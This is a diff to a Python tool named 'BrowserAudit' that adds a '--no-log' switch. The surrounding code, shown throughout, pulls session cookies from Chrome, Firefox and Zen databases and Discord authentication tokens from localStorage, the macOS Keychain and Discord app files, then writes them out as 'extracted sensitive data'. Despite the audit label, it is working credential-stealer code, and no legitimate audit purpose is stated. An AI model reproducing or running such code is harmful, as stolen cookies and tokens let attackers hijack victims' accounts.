@@ -119,12 +119,13 @@ class BrowserAudit:
             cursor = conn.cursor()
             cursor.execute("SELECT host_key, name, value FROM cookies")
 
-            with open(self.cookies_dir / "chrome_cookies.txt", 'w') as f:
-                for host, name, value in cursor.fetchall():
-                    f.write(f"Domain: {host}\n")
-                    f.write(f"Name: {name}\n")
-                    f.write(f"Value: {value}\n")
-                    f.write("-" * 60 + "\n\n")
+            if self.cookies_dir:
+                with open(self.cookies_dir / "chrome_cookies.txt", 'w') as f:
+                    for host, name, value in cursor.fetchall():
+                        f.write(f"Domain: {host}\n")
+                        f.write(f"Name: {name}\n")
+                        f.write(f"Value: {value}\n")
+                        f.write("-" * 60 + "\n\n")
 
             conn.close()
             print(f"{self.COLORS['GREEN']}[OK] Chrome cookies extracted{self.COLORS['RESET']}\n")
@@ -150,12 +151,13 @@ class BrowserAudit:
                     cursor = conn.cursor()
                     cursor.execute("SELECT host, name, value FROM moz_cookies")
 
-                    with open(self.cookies_dir / "firefox_cookies.txt", 'w') as f:
-                        for host, name, value in cursor.fetchall():
-                            f.write(f"Domain: {host}\n")
-                            f.write(f"Name: {name}\n")
-                            f.write(f"Value: {value}\n")
-                            f.write("-" * 60 + "\n\n")
+                    if self.cookies_dir:
+                        with open(self.cookies_dir / "firefox_cookies.txt", 'w') as f:
+                            for host, name, value in cursor.fetchall():
+                                f.write(f"Domain: {host}\n")
+                                f.write(f"Name: {name}\n")
+                                f.write(f"Value: {value}\n")
+                                f.write("-" * 60 + "\n\n")
 
                     conn.close()
                     found = True
@@ -187,12 +189,13 @@ class BrowserAudit:
                     cursor = conn.cursor()
                     cursor.execute("SELECT host, name, value FROM moz_cookies")
 
-                    with open(self.cookies_dir / "zen_cookies.txt", 'w') as f:
-                        for host, name, value in cursor.fetchall():
-                            f.write(f"Domain: {host}\n")
-                            f.write(f"Name: {name}\n")
-                            f.write(f"Value: {value}\n")
-                            f.write("-" * 60 + "\n\n")
+                    if self.cookies_dir:
+                        with open(self.cookies_dir / "zen_cookies.txt", 'w') as f:
+                            for host, name, value in cursor.fetchall():
+                                f.write(f"Domain: {host}\n")
+                                f.write(f"Name: {name}\n")
+                                f.write(f"Value: {value}\n")
+                                f.write("-" * 60 + "\n\n")
 
                     conn.close()
                     found = True
@@ -234,11 +237,12 @@ class BrowserAudit:
 
                 for key, value in cursor.fetchall():
                     if value and len(str(value)) > 50:
-                        with open(self.cookies_dir / "discord_web_tokens.txt", 'a') as f:
-                            f.write(f"[Discord Web localStorage]\n")
-                            f.write(f"Key: {key}\n")
-                            f.write(f"Token: {value}\n")
-                            f.write("-" * 60 + "\n\n")
+                        if self.cookies_dir:
+                            with open(self.cookies_dir / "discord_web_tokens.txt", 'a') as f:
+                                f.write(f"[Discord Web localStorage]\n")
+                                f.write(f"Key: {key}\n")
+                                f.write(f"Token: {value}\n")
+                                f.write("-" * 60 + "\n\n")
                         found_any = True
 
                 conn.close()
@@ -262,8 +266,9 @@ class BrowserAudit:
             )
             if result.returncode == 0 and result.stdout.strip():
                 token = result.stdout.strip()
-                with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
-                    f.write(f"[Discord-Keychain] {token}\n")
+                if self.cookies_dir:
+                    with open(self.cookies_dir / "discord_tokens.txt", 'a') as f:
+                        f.write(f"[Discord-Keychain] {token}\n")
                 print(f"{self.COLORS['GREEN']}[OK] Keychain token found{self.COLORS['RESET']}\n")
                 self.log("INFO", "Discord Keychain token extracted")
                 return True
@@ -324,7 +329,7 @@ class BrowserAudit:
 
                             # Extract all tokens from content
                             tokens = re.findall(token_pattern, content)
-                            if tokens:
+                            if tokens and self.cookies_dir:
                                 with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
                                     for token in set(tokens):
                                         out.write(f"[{app_name}] {token}\n")
@@ -332,7 +337,7 @@ class BrowserAudit:
 
                             # Extract hex/base64 data
                             hex_candidates = re.findall(hex_pattern, content)
-                            if hex_candidates:
+                            if hex_candidates and self.cookies_dir:
                                 with open(self.cookies_dir / "discord_tokens.txt", 'a') as out:
                                     for candidate in set(hex_candidates[:20]):
                                         if len(candidate) > 20:
@@ -376,6 +381,10 @@ class BrowserAudit:
         return '\n'.join(filtered).strip()
 
     def display_results(self):
+        if self.no_log:
+            print(f"\n{self.COLORS['CYAN']}[*] --no-log active: no files saved{self.COLORS['RESET']}\n")
+            return
+
         print(f"\n{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}")
         print(f"{self.COLORS['BLUE']}{'EXTRACTED SENSITIVE DATA':^60}{self.COLORS['RESET']}")
         print(f"{self.COLORS['BLUE']}{'=' * 60}{self.COLORS['RESET']}\n")
@@ -431,9 +440,10 @@ class BrowserAudit:
 
         self.display_results()
 
-        print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
-        print(f"{self.COLORS['GREEN']}Output: {self.audit_dir}{self.COLORS['RESET']}")
-        print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")
+        if not self.no_log:
+            print(f"\n{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}")
+            print(f"{self.COLORS['GREEN']}Output: {self.audit_dir}{self.COLORS['RESET']}")
+            print(f"{self.COLORS['BLUE']}[===========================================]{self.COLORS['RESET']}\n")
 
         self.log("INFO", "Audit completed successfully")
 
